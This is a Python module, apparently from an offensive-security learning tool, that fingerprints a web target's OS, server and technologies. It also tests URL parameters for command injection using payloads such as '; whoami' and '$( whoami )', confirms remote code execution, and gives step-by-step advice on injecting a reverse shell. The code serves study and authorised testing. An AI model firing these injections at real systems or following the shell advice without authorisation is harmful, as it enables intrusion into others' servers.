"""
Target detection and vulnerability scanning
"""

import requests
import re
import subprocess
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from learnshells.utils.logger import Logger
from learnshells.utils.network import NetworkUtils
from learnshells.utils.validator import Validator


class TargetDetector:
    """Detect target system information."""
    
    def __init__(self, logger: Logger = None):
        """
        Initialize target detector.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger()
        self.target_info = {}
    
    def detect_os(self, target_url: str) -> str:
        """
        Detect target operating system.
        
        Args:
            target_url: Target URL
            
        Returns:
            OS type (linux, windows, unknown)
        """
        self.logger.info("Detecting target OS...")
        
        try:
            response = requests.get(target_url, timeout=5)
            
            # Check Server header
            server = response.headers.get('Server', '').lower()
            
            if 'microsoft' in server or 'iis' in server:
                os_type = 'windows'
            elif 'apache' in server or 'nginx' in server:
                os_type = 'linux'
            else:
                # Try to detect from other headers
                headers_str = str(response.headers).lower()
                if 'windows' in headers_str or 'asp' in headers_str:
                    os_type = 'windows'
                elif 'unix' in headers_str or 'linux' in headers_str:
                    os_type = 'linux'
                else:
                    os_type = 'unknown'
            
            self.target_info['os'] = os_type
            self.logger.success(f"Detected OS: {os_type.upper()}")
            
            return os_type
            
        except Exception as e:
            self.logger.debug(f"OS detection failed: {e}")
            self.target_info['os'] = 'unknown'
            return 'unknown'
    
    def detect_web_server(self, target_url: str) -> str:
        """
        Detect web server type.
        
        Args:
            target_url: Target URL
            
        Returns:
            Web server type
        """
        try:
            response = requests.get(target_url, timeout=5)
            server = response.headers.get('Server', 'Unknown')
            
            self.target_info['web_server'] = server
            self.logger.info(f"Web server: {server}")
            
            return server
            
        except Exception:
            return 'Unknown'
    
    def detect_technologies(self, target_url: str) -> List[str]:
        """
        Detect technologies used by target.
        
        Args:
            target_url: Target URL
            
        Returns:
            List of detected technologies
        """
        self.logger.info("Detecting technologies...")
        
        technologies = []
        
        try:
            response = requests.get(target_url, timeout=5)
            
            # Check headers for clues
            headers = response.headers
            content = response.text.lower()
            
            # Detect programming languages
            if 'x-powered-by' in headers:
                powered_by = headers['x-powered-by'].lower()
                if 'php' in powered_by:
                    technologies.append('PHP')
                elif 'asp' in powered_by:
                    technologies.append('ASP.NET')
                elif 'express' in powered_by:
                    technologies.append('Node.js/Express')
            
            # Check content for hints
            if 'php' in content or '.php' in content:
                technologies.append('PHP')
            if 'asp' in content or '.aspx' in content:
                technologies.append('ASP.NET')
            if 'jsp' in content or '.jsp' in content:
                technologies.append('JSP/Java')
            if '__next' in content or 'next.js' in content:
                technologies.append('Next.js')
            if 'wp-content' in content:
                technologies.append('WordPress')
            
            # Remove duplicates
            technologies = list(set(technologies))
            
            if technologies:
                self.logger.success(f"Technologies: {', '.join(technologies)}")
            
            self.target_info['technologies'] = technologies
            
            return technologies
            
        except Exception as e:
            self.logger.debug(f"Technology detection failed: {e}")
            return []
    
# ========== DEBUG SECTION - Remove when done ==========
    def probe_target(self, target_url: str) -> Dict:
        """Comprehensive target probing."""
        self.logger.header("Target Reconnaissance")
        
        print("DEBUG: Before detect_os")
        os_result = self.detect_os(target_url)
        print(f"DEBUG: detect_os returned: {type(os_result)} = {os_result}")
        
        print("DEBUG: Before detect_web_server")
        web_server = self.detect_web_server(target_url)
        print(f"DEBUG: detect_web_server returned: {type(web_server)} = {web_server}")
        
        info = {
            'url': target_url,
            'ip': NetworkUtils.extract_ip_from_url(target_url),
            'os': os_result,
            'web_server': web_server,
            'technologies': self.detect_technologies(target_url),
        }
        
        self.target_info = info
        
        # Display summary
        self.logger.subheader("Target Information Summary")
        self.logger.list_item(f"URL: {info['url']}")
        self.logger.list_item(f"IP: {info['ip'] or 'Unknown'}")
        self.logger.list_item(f"OS: {info['os'].upper()}")
        self.logger.list_item(f"Web Server: {info['web_server']}")
        if info['technologies']:
            self.logger.list_item(f"Technologies: {', '.join(info['technologies'])}")
        
        return info
# ========== END DEBUG SECTION ==========

class VulnerabilityDetector:
    """Detect common vulnerabilities in web applications."""
    
    def __init__(self, logger: Logger = None):
        """
        Initialize vulnerability detector.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger()
        self.vulnerabilities = []
    
    def test_command_injection(self, target_url: str) -> bool:
        """
        Test for command injection vulnerability.
        
        Args:
            target_url: Target URL
            
        Returns:
            bool: True if vulnerable
        """
        self.logger.info("Testing for command injection...")
        
        # Parse URL to find parameters
        parsed = urlparse(target_url)
        params = parse_qs(parsed.query)
        
        if not params:
            self.logger.debug("No parameters found in URL")
            return False
        
        # Test payloads
        test_payloads = [
            '; whoami',
            '| whoami',
            '` whoami `',
            '$( whoami )',
            '&& whoami',
            '|| whoami',
        ]
        
        # Indicators of successful command injection
        indicators = ['root', 'www-data', 'apache', 'nginx', 'nt authority']
        
        for param_name in params.keys():
            for payload in test_payloads:
                # Inject payload into parameter
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                # Rebuild URL
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))
                
                try:
                    response = requests.get(test_url, timeout=5)
                    content = response.text.lower()
                    
                    # Check for indicators
                    if any(indicator in content for indicator in indicators):
                        self.logger.success(
                            f"Command injection detected in parameter '{param_name}'!",
                            explain="The application is executing OS commands with user input. "
                                   "This allows us to run arbitrary commands on the server."
                        )
                        self.vulnerabilities.append({
                            'type': 'command_injection',
                            'parameter': param_name,
                            'payload': payload,
                            'url': test_url
                        })
                        return True
                        
                except Exception as e:
                    self.logger.debug(f"Test failed: {e}")
                    continue
        
        self.logger.info("No command injection detected")
        return False
    
    def test_rce(self, target_url: str) -> Tuple[bool, Optional[str]]:
        """
        Test for Remote Code Execution.
        
        Args:
            target_url: Target URL
            
        Returns:
            Tuple of (is_vulnerable, execution_method)
        """
        self.logger.info("Testing for RCE...")
        
        # Try command injection first
        if self.test_command_injection(target_url):
            return True, 'command_injection'
        
        # Try other RCE vectors
        # (Add more tests here: file upload, deserialization, etc.)
        
        return False, None
    
    def verify_rce(self, target_url: str, payload: str = 'whoami') -> bool:
        """
        Verify RCE with a simple command.
        
        Args:
            target_url: Target URL with injection point
            payload: Command to execute
            
        Returns:
            bool: True if command executed
        """
        self.logger.info(f"Verifying RCE with: {payload}")
        
        try:
            # Inject payload into URL
            response = requests.get(target_url.replace('INJECT', payload), timeout=5)
            content = response.text.lower()
            
            # Check for common command output
            indicators = ['root', 'www-data', 'apache', 'uid=', 'gid=']
            
            if any(indicator in content for indicator in indicators):
                self.logger.success(
                    "RCE confirmed!",
                    explain="The target is executing our commands and returning output."
                )
                return True
            
        except Exception as e:
            self.logger.debug(f"Verification failed: {e}")
        
        return False
    
    def detect_vulnerabilities(self, target_url: str) -> List[Dict]:
        """
        Run all vulnerability tests.
        
        Args:
            target_url: Target URL
            
        Returns:
            List of detected vulnerabilities
        """
        self.logger.header("Vulnerability Scanning")
        
        self.vulnerabilities = []
        
        # Test for various vulnerabilities
        tests = [
            ("Command Injection", self.test_command_injection),
            # Add more tests here
        ]
        
        for test_name, test_func in tests:
            try:
                self.logger.info(f"Running: {test_name}")
                test_func(target_url)
            except Exception as e:
                self.logger.debug(f"{test_name} test error: {e}")
        
        # Summary
        if self.vulnerabilities:
            self.logger.success(f"Found {len(self.vulnerabilities)} vulnerabilities")
            for vuln in self.vulnerabilities:
                self.logger.list_item(
                    f"{vuln['type']} in parameter '{vuln.get('parameter', 'N/A')}'"
                )
        else:
            self.logger.warning("No obvious vulnerabilities detected")
        
        return self.vulnerabilities
    
    def get_exploitation_advice(self) -> str:
        """
        Get advice on how to exploit detected vulnerabilities.
        
        Returns:
            Exploitation advice string
        """
        if not self.vulnerabilities:
            return "No vulnerabilities detected to exploit."
        
        vuln = self.vulnerabilities[0]
        vuln_type = vuln['type']
        
        advice = {
            'command_injection': (
                "Command injection detected! Here's how to exploit it:\n\n"
                "1. The application executes OS commands with user input\n"
                "2. We can inject our reverse shell payload into the vulnerable parameter\n"
                "3. Use a payload appropriate for the target OS (Linux: bash/python, Windows: powershell)\n"
                "4. Start a listener on your machine first\n"
                "5. Inject the payload and catch the shell"
            ),
        }
        
        return advice.get(vuln_type, "Exploitation method varies by vulnerability type.")
